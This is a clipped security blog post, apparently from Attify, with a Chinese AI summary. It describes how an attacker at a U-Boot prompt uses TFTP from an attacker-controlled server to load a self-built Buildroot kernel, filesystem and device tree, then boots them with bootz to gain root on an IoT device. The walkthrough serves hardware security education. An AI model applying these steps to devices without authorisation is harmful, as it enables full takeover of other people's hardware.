---
title: To Boot Or Not To Boot – Practical Attack Vector
source: https://blog.attify.com/to-boot-or-not-to-boot-practical-attack-vector/
source_host: blog.attify.com
clip_date: 2026-09-11T10:21:09+08:00
trace_id: 19e1961f-4007-4f4c-825b-3b6745e1119c
content_hash: 52e92ff5a23e74b88084a3fc395bd79af9c3d6c7f611de14bfd3929372cef5ea
status: synced
tags:
  - 硬件逆向
  - 内核
series: null
feed_source: Attify
ai_summary: 在成功中断引导并进入 Das U-Boot 提示符后，攻击者可用 TFTP 把自建内核、文件系统和设备树加载进 DRAM 并启动，从而完全接管设备并拿到 root。
ai_summary_style: key-points
images_status:
  total: 13
  succeeded: 13
  failed_urls: []
notion_page_id: 3d875244-d011-81d7-b5c4-cf5a131ad5cb
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 在成功中断引导并进入 Das U-Boot 提示符后，攻击者可用 TFTP 把自建内核、文件系统和设备树加载进 DRAM 并启动，从而完全接管设备并拿到 root。
> 
> - **前置条件：** 需先破坏引导流程进入 U-Boot 提示符，攻击主机与目标处于同一网段，并预先构建好内核、文件系统与设备树文件。
> - **自建镜像（Buildroot）：** `make clean` 后 `make menuconfig`，Target 选 ARM little endian， Networking Applications 勾选 OpenSSH，Kernel Binary Format 选 uImage，再 `make all` 生成 zImage、rootfs.cpio.uboot、versatilepb.dtb。
> - **攻击端部署：** Debian 上 `apt-get install tftpd-hpa`、`service tftp-hpa start`，把三个文件放入 `/var/lib/tftpboot`；TFTP 基于 UDP 69 端口，无重传机制。
> - **U-Boot 操作序列：** `bdinfo` 查 DRAM 起始地址确定加载地址 → `setenv ipaddr`/`setenv serverip` 配网并 ping 验证 → `tftpboot <loadaddr> <serverip>:[filename]` 传输文件 → `bootz 0x41000000 0x42000000 0x41a00000` 分别指定内核、文件系统、设备树地址启动。
> - **隐蔽性：** 该手法复用厂商远程升级常用的机制与工具，属于"就地取材"式攻击，不易被察觉，在 IoT 场景中尤为危险。

## Introduction

![To Boot Or Not To Boot – Practical Attack Vector](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/90f439cb6321344c.jpg)

In this post, we will be completing the loop on our three-part series by describing a specific attack vector that is available upon successful bypass of the bootloader process.

Once landed within the Das U-Boot prompt, an attacker is able to surge forward to ultimately take over the device that underlies it. As our attack vector, we will be looking at using TFTP to load a kernel and filesystem of our own onto the affected target. We will look at how to first set up the attack device and then ultimately try our hand at gaining root access to our target device.

## What is TFTP

TFTP or Trivial File Transfer Protocol is a protocol whose use is quite ubiquitous due to its ease of use and great utility. Its main usage is to retrieve or transmit a file between compatible devices. This protocol uses UDP, meaning that it is stateless and typically runs over port 69. It is used for the transferring of files without the overhead one would expect with the use of a TCP-based protocol. Based on this efficiency it is typically considered the file transfer protocol of choice. One main drawback of TFTP is the lack of retransmission in the event that packets are lost over a network segment.

## Pre-requisite State

In order for this particular attack vector to be fully realized and enacted, a specific state of play is required to be in place.

1\. Breaking of the Bootloader Process

2\. Access to the U-Boot prompt

3\. A network segment that an attacker can co-opt, one of which is shared with the target device

4\. Preload/Prebuilt Kernel, Filesystem, and Device Tree files

With the above in place, we are ready to kick off the proceedings!

## Breaking it down

As we described in Part One and Two of the series, it is possible to interrupt the bootloader process in order to gain access to an intermediary stage within the boot process itself. We used the U-Boot example in our case to help illustrate a typical case scenario. Once access to the U-Boot prompt is gained we are then ready to forge further attacks. Casting your mind back to Part Two of the series, we remember that the U-Boot prompt has a vernacular/syntax of its own and it is this very syntax that we will be using to further our cause.

The specific vector that we have chosen for this blog, is the utilization of the TFTP protocol to assist in circumventing the intended boot process. In essence, we will look to bypass the hardened firmware image and supplant one of our own.

A practical use case for this type of attack is surprisingly common, as most vendors and/or companies utilize this type of approach for remote upgrades and hence the vector itself can typically fly under the radar using tools and mechanisms that are frequently available. This allows an attack to “ *live off the land* ” without the need to implement foreign toolsets.

## Required Files

In order to fully actualize the end result, we will build out the main three files required, in order that they are used to circumvent the intended boot process and finally allow for the takeover of the target device.

Following on from **Part One** and **Part Two** of this series we will further utilize **buildroot** to assist in the building of:

1\. The Kernel (zImage)

2\. The Filesystem (rootfs.cpio.uboot) **AND**

3\. The Device Tree Blob (versatilepb.dtb)

These three files are needed to successfully load the final image onto our target device.

## The Buildroot Process

The buildroot process allows us to compile the necessary kernel, filesystem, and device tree that we will use for this attack.

**Buildroot Configuration**

This takes us into the main configuration menu, which we will use to set all applicable options for our chosen architecture and platform.

Prior to commencement, we ensure a clean build by issuing the ***make clean*** command

![To Boot Or Not To Boot – Practical Attack Vector](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/97cceca18c348f9a.png)

We can then proceed to invoke the buildroot config menu by issuing the ***make menuconfig*** command

![To Boot Or Not To Boot – Practical Attack Vector](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/49ffe4e583ed97da.png)

This will land us in the **Buildroot Configuration Menu**, which allows for the applicable configuration to take place.

![To Boot Or Not To Boot – Practical Attack Vector](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/56b77a9f8fbeb49a.png)

Figure 1. Buildroot Configuration Menu

Whilst here we will ensure the following configuration items are chosen.

\- ‘Target Options’ -> ‘Target Architecture (ARM (little endian))’

\- ‘Networking Applications’ -> ‘OpenSSH’

\- ‘Kernel’ -> ‘Kernel Binary Format’ -> ‘uImage’

Once satisfied that these options are configured we can save the configuration and drop back to a shell.

From here we issue the ***make all*** command and take the opportunity to enjoy a long overdue coffee break to allow buildroot to do its thing!

![To Boot Or Not To Boot – Practical Attack Vector](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/01cb03d115882a8a.png)

Once complete we should be left with the required files which allows us to move on to the next step.

## Setting up the attacking platform

In order to make this attack vector viable we need to setup and configure a host under attacker control. This device will host the required files and offer a TFTP service to any interested parties to gladly utilise.

Based on our chosen Debian flavored NIX\* we go about setting up and configuring the HPA's tftp server.

Following outlines the installation and configuration:

**1\. *sudo apt-get install tftpd-hpa*** – Install the package

**2\. *sudo service tftp-hpa start* -** Start the service

**3\. *cp zImage versatile-pb.dtb rootfs.cpio.uboot /var/lib/tftpboot*** - /var/lib/tftpboot is the root tftp directory and must contain any files you would like to transfer

![To Boot Or Not To Boot – Practical Attack Vector](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6684333b52634a82.png)

Figure 2. Netstat shows service listening

## Leveraging U-Boot

Now that our attacking ecosystem is setup to accept incoming TFTP requests we will return to the U-Boot prompt that we are familiar with from the previous two blog posts, which looks something like this:

![To Boot Or Not To Boot – Practical Attack Vector](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4ca4e922f3f42992.png)

Figure 3. U-Boot Prompt (version command issued)

We are now ready to start leveraging the U-Boot prompt and make it do our bidding.

Step 1. Examination of the DRAM structure in order to ascertain the correct load address for our kernel image. We are looking for the starting address.

\- Issuing the ***bdinfo*** command provides us with this information denoted by the DRAM Bank start register.

![To Boot Or Not To Boot – Practical Attack Vector](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d93133bb9dd77694.png)

Figure 4. U-Boot Prompt ( bdinfo command issued)

Step2. Configuration of the network layer in order to commence communications with our attackers TFTP server.

\- Issuing the ***setenv ipaddr <target device ip address>*** and ***setenv serverip <tftp ip address>***, allows us to build a layer 3 connection between the target device and the attackers TFTP server host.

![To Boot Or Not To Boot – Practical Attack Vector](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2a9b4512e6ac9791.png)

To Boot Or Not To Boot – Practical Attack Vector

\- To confirm communications we will ping the serverip, just for the completeness

![To Boot Or Not To Boot – Practical Attack Vector](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4d94da356f661489.png)

To Boot Or Not To Boot – Practical Attack Vector

Step 3. Copy the required files into specified DRAM locations using TFTP.

\- Issuing the ***tftpboot*** ***<loadaddress> <tftp server ip>:\[filename\]*** allows for the transfer and subsequent loading of files into the target devices DRAM address space.

![To Boot Or Not To Boot – Practical Attack Vector](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/db48cd81c16262dd.png)

To Boot Or Not To Boot – Practical Attack Vector

Step 4. Boot the target device kernel image incorporating all load address attributes

\- Issuing the ***bootz 0x41000000 0x42000000 0x41a00000*** command boots the target system incorporating kernel, filesystem and device tree using their corresponding memory address ranges

![To Boot Or Not To Boot – Practical Attack Vector](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2a5a9aeb05e8c349.png)

To Boot Or Not To Boot – Practical Attack Vector

Step 5. Enjoy newfound root privileges ‘wOOt’

![To Boot Or Not To Boot – Practical Attack Vector](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/123c3592e746812f.png)

To Boot Or Not To Boot – Practical Attack Vector

## Final Thoughts

As has been outlined in this three part series the boot process is made up of many moving parts, which if inappropriately handled can add up to a significant compromise if left unchecked and uncontrolled. We have attempted to scratch the surface of describing Bootloaders, Das U-Boot, and finally a Practical Attack Vector that is typically used by attackers to gain further footholds into such environments. The main takeaway of this blog series was to help illuminate how the understanding of somewhat simple concepts of the boot process sheds light on a more often overlooked compromise which in the day and age of the growing IoT universe gives further options to nefarious types that may be used to ultimately bypass and takeover target systems for no other purpose other than for the lulz.

We at **Attify** hope you have enjoyed this series. Stay tuned for a lot more to come!!!
